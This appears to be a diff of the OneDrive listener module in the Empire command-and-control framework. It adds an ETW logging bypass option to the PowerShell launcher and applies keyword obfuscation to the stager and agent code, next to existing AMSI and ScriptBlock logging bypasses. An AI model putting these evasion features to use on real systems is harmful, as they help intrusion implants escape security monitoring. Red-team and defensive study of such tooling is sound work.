@@ -1,26 +1,23 @@
 from __future__ import print_function
-from builtins import str
-from builtins import object
+
 import base64
-import random
+import copy
+import json
 import os
 import re
 import time
-from datetime import datetime
-import copy
 import traceback
-import sys
-import json
+from builtins import object
+from builtins import str
+from datetime import datetime
+
 from pydispatch import dispatcher
 from requests import Request, Session
 
+from lib.common import bypasses
+from lib.common import encryption
 # Empire imports
 from lib.common import helpers
-from lib.common import agents
-from lib.common import encryption
-from lib.common import packets
-from lib.common import messages
-from lib.common import bypasses
 
 
 class Listener(object):
@@ -178,7 +175,7 @@ class Listener(object):
 
     def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default',
                           proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='',
-                          listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
+                          listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False, ETWBypass=False):
         if not language:
             print(helpers.color("[!] listeners/onedrive generate_launcher(): No language specified"))
 
@@ -203,6 +200,8 @@ class Listener(object):
                     # ScriptBlock Logging bypass
                     if scriptLogBypass:
                         launcher += bypasses.scriptBlockLogBypass()
+                    if ETWBypass:
+                        launcher += bypasses.ETWBypass()
                     # @mattifestation's AMSI bypass
                     if AMSIBypass:
                         launcher += bypasses.AMSIBypass()
@@ -296,6 +295,8 @@ class Listener(object):
             f = open("%s/data/agent/stagers/onedrive.ps1" % self.mainMenu.installPath)
             stager = f.read()
             f.close()
+            # Get the random function name generated at install and patch the stager with the proper function name
+            stager = helpers.keyword_obfuscation(stager)
 
             stager = stager.replace("REPLACE_STAGING_FOLDER", "%s/%s" % (base_folder, staging_folder))
             stager = stager.replace('REPLACE_STAGING_KEY', staging_key)
@@ -468,6 +469,9 @@ class Listener(object):
             f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
             agent_code = f.read()
             f.close()
+
+
+            agent_code = helpers.keyword_obfuscation(agent_code)
 
             comms_code = self.generate_comms(listener_options, client_id, client_secret, token, refresh_token,
                                              redirect_uri, language)
